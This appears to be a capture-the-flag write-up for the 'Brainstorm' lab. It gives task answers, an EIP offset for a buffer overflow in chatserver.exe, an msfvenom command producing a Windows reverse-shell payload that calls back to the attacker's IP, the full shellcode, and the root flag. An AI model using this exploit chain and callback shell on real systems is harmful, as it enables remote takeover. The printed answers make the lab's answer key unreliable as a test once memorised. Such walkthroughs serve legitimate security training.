# BRAINSTORM

## Task 1  Deploy Machine and Scan Network
+ Deploy the machine `No Answer Needed`
+ How many ports are open?`6`

## Task 2  Accessing Files
+ What is the name of the exe file you found?`chatserver.exe`

## Task 3  Access
+ Read the description. `No Answer Needed`
+ After testing for overflow, by entering a large number of characters, determine the EIP offset.`No Answer Needed` it's `2012`
+ Now you know that you can overflow a buffer and potentially control execution, you need to find a function where ASLR/DEP is not enabled. Why not check the DLL file.`No Answer Needed` using .dll to check the JUMP ESP
+ Since this would work, you can try generate some shellcode - use msfvenom to generate shellcode for windows.`No Answer Needed`
```bash
┌──(lodwig㉿kali)-[~]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.4.37.160 LPORT=1337 -b '\\x00\\n\\r\\x20' -f c
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 12 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of c file: 1491 bytes
unsigned char buf[] =
"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\x99\xd8\xb5\xed\x83\xee\xfc\xe2\xf4\x65\x30\x37\xed"
"\x99\xd8\xd5\x64\x7c\xe9\x75\x89\x12\x88\x85\x66\xcb\xd4"
"\x3e\xbf\x8d\x53\xc7\xc5\x96\x6f\xff\xcb\xa8\x27\x19\xd1"
"\xf8\xa4\xb7\xc1\xb9\x19\x7a\xe0\x98\x1f\x57\x1f\xcb\x8f"
"\x3e\xbf\x89\x53\xff\xd1\x12\x94\xa4\x95\x7a\x90\xb4\x3c"
"\xc8\x53\xec\xcd\x98\x0b\x3e\xa4\x81\x3b\x8f\xa4\x12\xec"
"\x3e\xec\x4f\xe9\x4a\x41\x58\x17\xb8\xec\x5e\xe0\x55\x98"
"\x6f\xdb\xc8\x15\xa2\xa5\x91\x98\x7d\x80\x3e\xb5\xbd\xd9"
"\x66\x8b\x12\xd4\xfe\x66\xc1\xc4\xb4\x3e\x12\xdc\x3e\xec"
"\x49\x51\xf1\xc9\xbd\x83\xee\x8c\xc0\x82\xe4\x12\x79\x87"
"\xea\xb7\x12\xca\x5e\x60\xc4\xb0\x86\xdf\x99\xd8\xdd\x9a"
"\xea\xea\xea\xb9\xf1\x94\xc2\xcb\x9e\x27\x60\x55\x09\xd9"
"\xb5\xed\xb0\x1c\xe1\xbd\xf1\xf1\x35\x86\x99\x27\x60\xbd"
"\xc9\x88\xe5\xad\xc9\x98\xe5\x85\x73\xd7\x6a\x0d\x66\x0d"
"\x22\x87\x9c\xb0\xbf\xe9\xbc\x78\xdd\xef\x99\xdd\x8c\x64"
"\x7f\xb2\xa5\xbb\xce\xb0\x2c\x48\xed\xb9\x4a\x38\x1c\x18"
"\xc1\xe1\x66\x96\xbd\x98\x75\xb0\x45\x58\x3b\x8e\x4a\x38"
"\xf1\xbb\xd8\x89\x99\x51\x56\xba\xce\x8f\x84\x1b\xf3\xca"
"\xec\xbb\x7b\x25\xd3\x2a\xdd\xfc\x89\xec\x98\x55\xf1\xc9"
"\x89\x1e\xb5\xa9\xcd\x88\xe3\xbb\xcf\x9e\xe3\xa3\xcf\x8e"
"\xe6\xbb\xf1\xa1\x79\xd2\x1f\x27\x60\x64\x79\x96\xe3\xab"
"\x66\xe8\xdd\xe5\x1e\xc5\xd5\x12\x4c\x63\x45\x58\x3b\x8e"
"\xdd\x4b\x0c\x65\x28\x12\x4c\xe4\xb3\x91\x93\x58\x4e\x0d"
"\xec\xdd\x0e\xaa\x8a\xaa\xda\x87\x99\x8b\x4a\x38";
```
+ After gaining access, what is the content of the root.txt file?`5b1001de5a44eca47eee71e7942a8f8a`
```bash
C:\Users\drake\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C87F-5040

 Directory of C:\Users\drake\Desktop

08/29/2019  09:55 PM    <DIR>          .
08/29/2019  09:55 PM    <DIR>          ..
08/29/2019  09:55 PM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  19,661,803,520 bytes free

C:\Users\drake\Desktop>type root.txt
type root.txt
5b1001de5a44eca47eee71e7942a8f8a
```